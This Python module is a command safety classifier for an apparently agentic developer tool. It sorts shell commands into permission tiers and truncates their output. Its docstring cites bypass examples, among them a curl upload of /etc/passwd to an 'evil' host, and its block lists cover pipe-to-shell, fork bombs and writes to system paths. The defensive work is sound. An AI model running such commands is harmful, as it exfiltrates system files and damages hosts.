"""
Developer Tools — Safety Module

Command safety classifier + output sanitizer.

Session #8 redesign (agentic-audit CRITICAL finding): the previous
classifier only ever inspected the first one or two whitespace-split
words of a command (e.g. "find", "git branch"), and never split a
command on `|` (pipe) at all. That meant `find /home -delete`,
`git branch -D main`, `git remote add evil ...`, `git tag -d v1.0`,
`curl -T /etc/passwd http://evil/...`, and `ps aux | xargs kill -9`
all classified as 'allowed' — the base command matched a Tier-1
read-only entry while the actual destructive/mutating behaviour lives
entirely in the arguments (or, for pipes, in a later segment the old
code never looked at).

This redesign does NOT stack more regexes on top of the old model. It
replaces the classification core with:

  1. Chain-splitting on ; && || newline/lone & (unchanged from session
     #7 — still the conservative "any chain forces >= confirmation"
     policy, since a chain can smuggle an unrelated dangerous command
     after a harmless-looking first one).
  2. Pipe-splitting EVERY chain segment on literal `|` tokens, using
     shlex tokenization (quote-aware — `grep "a|b" file` is not split,
     confirmed empirically) so a pipeline's later stages are no longer
     invisible to the classifier.
  3. Argument-sensitive validators for the commands whose safety
     genuinely depends on their arguments (find, git and its
     subcommands, curl/wget, xargs, systemctl, pip/apt/dpkg/docker),
     dispatched by base command name. Commands without a dedicated
     validator fall back to the old tier-set membership check (now
     applied per pipe-segment, not just to the whole string), and any
     command this module cannot classify at all defaults to
     'confirmation' rather than 'allowed' — default-deny for the
     unknown case.

A pure pipeline (no chain operators) of all-read-only segments (e.g.
"ps aux | grep foo") still classifies as 'allowed' — that is ordinary,
intended usage. A pipeline where any segment classifies worse than
'allowed' (e.g. "find . | xargs rm -f", where the xargs validator
recursively classifies its target command "rm -f" as 'confirmation')
takes that segment's tier for the whole pipeline. Chained commands
(;, &&, ||) still never classify better than 'confirmation' as a
whole, regardless of individual segment tiers, per session #7's
existing (retained) policy.
"""

import re
import shlex
from typing import List, Tuple

# Tier 1: Always allowed (read-only) — base/two-word commands with no
# argument-sensitive validator below. Commands that DO have a
# dedicated validator (find, git, curl, wget, xargs, systemctl, pip,
# apt, dpkg, docker) are intentionally NOT relied on via this set for
# their own classification — the validator decides instead, and takes
# precedence over any entry here for that base command.
TIER1_ALLOWED = {
    # File inspection
    'cat', 'head', 'tail', 'less', 'wc', 'file', 'stat',
    # Search
    'grep', 'rg', 'locate', 'which', 'whereis',
    # Listing
    'ls', 'tree', 'du', 'df',
    # System info
    'ps', 'top', 'htop', 'free', 'uptime', 'uname', 'lsb_release',
    'lscpu', 'lsblk', 'lsusb', 'lspci', 'hostname', 'whoami', 'id',
    'nproc', 'arch',
    # Network info
    'ip', 'ifconfig', 'ping', 'dig', 'nslookup', 'host', 'ss', 'netstat',
    # Service status
    'journalctl', 'service --status-all',
    # Package info (bare/no-subcommand forms; pip/apt/dpkg have their
    # own argument-sensitive validators for the subcommand case)
    'python3 --version', 'python --version', 'node --version',
    'npm list', 'ffmpeg -version',
    # Misc
    'date', 'cal', 'env', 'printenv',
}

# Tier 2: Safe writes (non-destructive)
TIER2_SAFE_WRITES = {
    'cp', 'mkdir', 'touch',
    'tee', 'chmod', 'chown',
}

# Tier 3: Confirmation required (destructive)
TIER3_CONFIRMATION = {
    'rm', 'rmdir', 'mv', 'kill', 'killall', 'pkill',
    'truncate',
}

# Blocked — never allowed
BLOCKED_COMMANDS = {
    'sudo', 'su', 'dd', 'mkfs', 'fdisk', 'parted',
    'shutdown', 'reboot', 'poweroff', 'halt', 'init',
    'eval', 'exec',
    'passwd', 'useradd', 'userdel', 'usermod',
    'iptables', 'ufw',
    'mount', 'umount',
    'crontab',
}

# Blocked patterns (regex) — checked against the full raw string before
# any tokenizing/splitting, as defense in depth.
BLOCKED_PATTERNS = [
    r'\|\s*bash',          # pipe to bash
    r'\|\s*sh\b',          # pipe to sh
    r'\$\(',              # command substitution
    r'`[^`]+`',           # backtick execution
    r'>\s*/dev/sd',        # write to block devices
    r'>\s*/etc/',          # write to system config
    r'rm\s+-rf?\s+/',      # rm -rf /
    r':\(\)\{',            # fork bomb
    r'>\s*/proc/',         # write to proc
    r'>\s*/sys/',          # write to sys
]

# Command-chaining operators: ;  &&  ||  newline  or a lone backgrounding
# & (not part of &&). A chain can smuggle an unrelated dangerous command
# after a harmless-looking first one, so any chain forces >= 'confirmation'
# for the whole command regardless of individual segment tiers.
_CHAIN_OPERATOR_RE = re.compile(r';|&&|\|\||\n|(?<!&)&(?!&)')

_TIER_SEVERITY = {'allowed': 0, 'safe_write': 1, 'confirmation': 2, 'blocked': 3}


def _worse(a: str, b: str) -> str:
    return a if _TIER_SEVERITY[a] >= _TIER_SEVERITY[b] else b


# ---------------------------------------------------------------------
# Argument-sensitive validators
# ---------------------------------------------------------------------

_FIND_DANGEROUS_ACTIONS = {
    '-delete', '-exec', '-execdir', '-ok', '-okdir', '-fprintf', '-fls',
}


def _validate_find(tokens: List[str]) -> Tuple[str, str]:
    for t in tokens[1:]:
        if t in _FIND_DANGEROUS_ACTIONS:
            return (
                'confirmation',
                f'find with "{t}" can modify or execute files — requires confirmation',
            )
    return ('allowed', 'Read-only find (no destructive action flags)')


def _validate_git_branch(rest: List[str]) -> Tuple[str, str]:
    delete_or_move = {'-d', '-D', '--delete', '-m', '-M', '--move', '--force'}
    if any(a in delete_or_move for a in rest):
        return ('confirmation', 'git branch delete/rename requires confirmation')
    if any(not a.startswith('-') for a in rest):
        return ('safe_write', 'git branch create')
    return ('allowed', 'git branch listing')


def _validate_git_remote(rest: List[str]) -> Tuple[str, str]:
    mutating = {'add', 'remove', 'rm', 'set-url', 'rename', 'set-head', 'set-branches', 'prune'}
    if rest and rest[0] in mutating:
        return (
            'confirmation',
            f'git remote {rest[0]} mutates remote configuration — requires confirmation',
        )
    return ('allowed', 'git remote read (list/show/-v)')


def _validate_git_tag(rest: List[str]) -> Tuple[str, str]:
    if any(a in {'-d', '--delete'} for a in rest):
        return ('confirmation', 'git tag delete requires confirmation')
    if any(not a.startswith('-') for a in rest):
        return ('safe_write', 'git tag create')
    return ('allowed', 'git tag listing')


def _validate_git_stash(rest: List[str]) -> Tuple[str, str]:
    if not rest or rest[0] == 'list':
        return ('allowed', 'git stash list')
    if rest[0] in {'drop', 'clear'}:
        return (
            'confirmation',
            f'git stash {rest[0]} permanently discards stashed changes — requires confirmation',
        )
    if rest[0] in {'push', 'save', 'pop', 'apply', 'show'}:
        return ('safe_write', f'git stash {rest[0]}')
    return ('confirmation', f'Unknown git stash subcommand "{rest[0]}" — requires confirmation')


_GIT_SUBCOMMAND_VALIDATORS = {
    'branch': _validate_git_branch,
    'remote': _validate_git_remote,
    'tag': _validate_git_tag,
    'stash': _validate_git_stash,
}

_GIT_READONLY_SUBCOMMANDS = {
    'status', 'log', 'diff', 'show', 'blame', 'shortlog', 'describe', 'reflog',
}
_GIT_SAFE_WRITE_SUBCOMMANDS = {'add', 'commit'}
_GIT_CONFIRMATION_SUBCOMMANDS = {
    'reset', 'clean', 'checkout', 'revert', 'push', 'pull', 'fetch',
    'merge', 'rebase', 'cherry-pick', 'filter-branch',
}


def _validate_git(tokens: List[str]) -> Tuple[str, str]:
    if len(tokens) < 2:
        return ('allowed', 'git with no subcommand')
    sub = tokens[1]
    rest = tokens[2:]

    handler = _GIT_SUBCOMMAND_VALIDATORS.get(sub)
    if handler:
        return handler(rest)

    if sub == 'config':
        # Two positional args (key + value) is a write; anything else
        # (bare, --list, --get <key>) is a read.
        positional = [a for a in rest if not a.startswith('-')]
        if len(positional) >= 2:
            return ('confirmation', 'git config with a value writes config — requires confirmation')
        return ('allowed', 'git config read')

    if sub in _GIT_READONLY_SUBCOMMANDS:
        return ('allowed', f'Read-only git subcommand: {sub}')
    if sub in _GIT_SAFE_WRITE_SUBCOMMANDS:
        return ('safe_write', f'Safe git write: {sub}')
    if sub in _GIT_CONFIRMATION_SUBCOMMANDS:
        return ('confirmation', f'git subcommand "{sub}" requires confirmation')

    return ('confirmation', f'Unclassified git subcommand "{sub}" — requires confirmation')


def _has_flag(tokens: List[str], flags: set) -> bool:
    """True if any token is one of `flags`, or a `--long=value` form of
    one of them (GNU-style long options accept an attached value with
    `=`, e.g. `--post-file=/etc/shadow`, which a plain membership check
    against the bare flag name would miss)."""
    for t in tokens:
        if t in flags:
            return True
        if t.startswith('--') and '=' in t and t.split('=', 1)[0] in flags:
            return True
    return False


_CURL_WRITE_FLAGS = {
    '-o', '--output', '-O', '--remote-name', '-T', '--upload-file',
    '-d', '--data', '--data-ascii', '--data-urlencode', '--data-binary',
    '--data-raw', '-F', '--form', '-K', '--config',
}


def _validate_curl(tokens: List[str]) -> Tuple[str, str]:
    if _has_flag(tokens[1:], _CURL_WRITE_FLAGS):
        return ('confirmation', 'curl with upload/output/data flags requires confirmation')
    return ('allowed', 'curl read-only request')


_WGET_WRITE_FLAGS = {
    '-O', '--output-document', '--post-data', '--post-file',
    '-r', '--recursive', '-i', '--input-file',
}


def _validate_wget(tokens: List[str]) -> Tuple[str, str]:
    if _has_flag(tokens[1:], _WGET_WRITE_FLAGS):
        return ('confirmation', 'wget with output/post/recursive flags requires confirmation')
    # Even a bare wget writes the downloaded file to local disk.
    return ('safe_write', 'wget downloads file to local disk')


_XARGS_FLAGS_WITH_ARG = {'-I', '-n', '-P', '-L', '-s', '-l', '-E'}


def _validate_xargs(tokens: List[str]) -> Tuple[str, str]:
    idx = 1
    target: List[str] = []
    while idx < len(tokens):
        t = tokens[idx]
        if t in _XARGS_FLAGS_WITH_ARG:
            idx += 2
            continue
        if t.startswith('-'):
            idx += 1
            continue
        target = tokens[idx:]
        break
    if not target:
        return ('allowed', 'xargs with no target command (defaults to echo)')
    result = _classify_tokens(target)
    return (result[0], f'xargs wrapping "{target[0]}": {result[1]}')


_SYSTEMCTL_READONLY = {
    'status', 'is-active', 'is-enabled', 'is-failed',
    'list-units', 'list-unit-files', 'show', 'cat',
}
_SYSTEMCTL_MUTATING = {
    'stop', 'restart', 'start', 'reload', 'reload-or-restart',
    'kill', 'mask', 'unmask', 'disable', 'enable', 'edit', 'daemon-reload',
}


def _validate_systemctl(tokens: List[str]) -> Tuple[str, str]:
    if len(tokens) < 2:
        return ('confirmation', 'systemctl with no subcommand — requires confirmation')
    sub = tokens[1]
    if sub in _SYSTEMCTL_READONLY:
        return ('allowed', f'systemctl read-only: {sub}')
    if sub in _SYSTEMCTL_MUTATING:
        return ('confirmation', f'systemctl {sub} requires confirmation')
    return ('confirmation', f'Unknown systemctl subcommand "{sub}" — requires confirmation')


def _make_subcommand_validator(name: str, readonly_subs: set, mutating_subs: set):
    def validator(tokens: List[str]) -> Tuple[str, str]:
        if len(tokens) < 2:
            return ('confirmation', f'{name} with no subcommand — requires confirmation')
        sub = tokens[1]
        if sub in readonly_subs:
            return ('allowed', f'{name} read-only: {sub}')
        if sub in mutating_subs:
            return ('confirmation', f'{name} {sub} requires confirmation')
        return ('confirmation', f'Unknown {name} subcommand "{sub}" — requires confirmation')
    return validator


_validate_pip = _make_subcommand_validator(
    'pip', {'list', 'show', 'freeze', '--version'}, {'install', 'uninstall', 'download'},
)
_validate_apt = _make_subcommand_validator(
    'apt', {'list', 'show', 'search', 'policy'},
    {'install', 'remove', 'purge', 'autoremove', 'update', 'upgrade'},
)
_validate_dpkg = _make_subcommand_validator(
    'dpkg', {'-l', '-s', '-L', '--list', '--status'},
    {'-i', '--install', '-r', '--remove', '-P', '--purge'},
)
_validate_docker = _make_subcommand_validator(
    'docker', {'ps', 'images', 'logs', 'inspect', 'version', 'info'},
    {'rm', 'rmi', 'stop', 'kill', 'exec', 'run', 'build', 'push', 'pull', 'compose'},
)

_VALIDATORS = {
    'find': _validate_find,
    'git': _validate_git,
    'curl': _validate_curl,
    'wget': _validate_wget,
    'xargs': _validate_xargs,
    'systemctl': _validate_systemctl,
    'pip': _validate_pip,
    'pip3': _validate_pip,
    'apt': _validate_apt,
    'apt-get': _validate_apt,
    'dpkg': _validate_dpkg,
    'docker': _validate_docker,
}


def _classify_by_tier_sets(tokens: List[str]) -> Tuple[str, str]:
    """Fallback for base commands with no dedicated validator — tier-set
    membership check, now driven by shlex tokens (quote-aware) instead
    of a naive whitespace split."""
    base_cmd = tokens[0]
    two_word = f"{tokens[0]} {tokens[1]}" if len(tokens) > 1 else ""

    if two_word in TIER1_ALLOWED:
        return ('allowed', f'Read-only command: {two_word}')
    if base_cmd in TIER1_ALLOWED:
        return ('allowed', f'Read-only command: {base_cmd}')

    if two_word in TIER2_SAFE_WRITES:
        return ('safe_write', f'Safe write operation: {two_word}')
    if base_cmd in TIER2_SAFE_WRITES:
        return ('safe_write', f'Safe write operation: {base_cmd}')

    if two_word in TIER3_CONFIRMATION:
        return ('confirmation', f'Destructive operation requires confirmation: {two_word}')
    if base_cmd in TIER3_CONFIRMATION:
        return ('confirmation', f'Destructive operation requires confirmation: {base_cmd}')

    # Default-deny: any command this module cannot positively classify
    # as read-only or a known safe/destructive tier requires at least
    # confirmation.
    return ('confirmation', f'Unknown command "{base_cmd}" — requires confirmation')


def _classify_tokens(tokens: List[str]) -> Tuple[str, str]:
    """Classify one already-tokenized, single (non-chained, non-piped)
    command segment."""
    if not tokens:
        return ('blocked', 'Empty command segment')
    base_cmd = tokens[0]
    if base_cmd in BLOCKED_COMMANDS:
        return ('blocked', f'Command "{base_cmd}" is never allowed')
    validator = _VALIDATORS.get(base_cmd)
    if validator:
        return validator(tokens)
    return _classify_by_tier_sets(tokens)


def _split_pipeline_tokens(tokens: List[str]) -> List[List[str]]:
    """Split a token list on literal '|' tokens (shlex already keeps a
    quoted pipe character, e.g. inside "a|b", as part of a word rather
    than its own token — confirmed empirically — so this only splits on
    real, unquoted pipe operators)."""
    segments: List[List[str]] = [[]]
    for t in tokens:
        if t == '|':
            segments.append([])
        else:
            segments[-1].append(t)
    return [s for s in segments if s]


def classify_command(command: str) -> Tuple[str, str]:
    """
    Classify a command into a safety tier.

    Returns:
        Tuple of (tier, reason) where tier is one of:
        'allowed', 'safe_write', 'confirmation', 'blocked'
    """
    stripped = command.strip()
    if not stripped:
        return ('blocked', 'Empty command')

    # Blocked patterns first, against the FULL raw string — defense in
    # depth regardless of how the string later tokenizes.
    for pattern in BLOCKED_PATTERNS:
        if re.search(pattern, stripped):
            return ('blocked', f'Blocked pattern detected: {pattern}')

    is_chained = bool(_CHAIN_OPERATOR_RE.search(stripped))
    chain_segments = [s.strip() for s in _CHAIN_OPERATOR_RE.split(stripped) if s.strip()]
    if not chain_segments:
        return ('confirmation', 'Unparseable chained command')

    seg_results: List[Tuple[str, str]] = []
    for chain_seg in chain_segments:
        try:
            tokens = shlex.split(chain_seg, posix=True)
        except ValueError:
            # Unbalanced quotes etc. — an ambiguous form we cannot
            # safely parse, so it gets at least confirmation.
            seg_results.append(('confirmation', f'Unparseable command segment: {chain_seg!r}'))
            continue
        if not tokens:
            continue
        for pipe_tokens in _split_pipeline_tokens(tokens):
            seg_results.append(_classify_tokens(pipe_tokens))

    if not seg_results:
        return ('blocked', 'Empty command')

    worst_tier = 'allowed'
    worst_reason = seg_results[0][1]
    for tier, reason in seg_results:
        if _TIER_SEVERITY[tier] > _TIER_SEVERITY[worst_tier]:
            worst_tier, worst_reason = tier, reason

    if worst_tier == 'blocked':
        return ('blocked', f'Command contains a blocked segment: {worst_reason}')

    if is_chained:
        # Chained commands (;, &&, ||, newline, lone &) never classify
        # better than 'confirmation' as a whole, regardless of
        # individual segment tiers — a chain can smuggle an unrelated
        # dangerous command after a harmless-looking first one.
        return (
            _worse('confirmation', worst_tier),
            f'Chained/compound command requires confirmation (worst segment: {worst_reason})',
        )

    if len(seg_results) > 1:
        # Pure pipeline (no chaining): the worst segment's own tier
        # applies to the whole pipeline. An all-read-only pipeline
        # (e.g. "ps aux | grep foo") stays 'allowed' — ordinary,
        # intended usage — while a pipeline whose target segment is
        # destructive (e.g. "find . | xargs rm -f") is not.
        return (worst_tier, f'Pipeline classification (worst segment): {worst_reason}')

    return seg_results[0]


def sanitize_output(output: str, max_lines: int = 200, max_chars: int = 8000) -> str:
    """
    Sanitize command output for display/LLM processing.
    Truncates long output and strips ANSI escape codes.
    """
    # Strip ANSI escape codes
    ansi_pattern = re.compile(r'\x1b\[[0-9;]*m')
    clean = ansi_pattern.sub('', output)

    lines = clean.split('\n')
    if len(lines) > max_lines:
        truncated = lines[:max_lines]
        truncated.append(f"\n... ({len(lines) - max_lines} more lines truncated)")
        clean = '\n'.join(truncated)

    if len(clean) > max_chars:
        clean = clean[:max_chars] + f"\n... (truncated at {max_chars} characters)"

    return clean
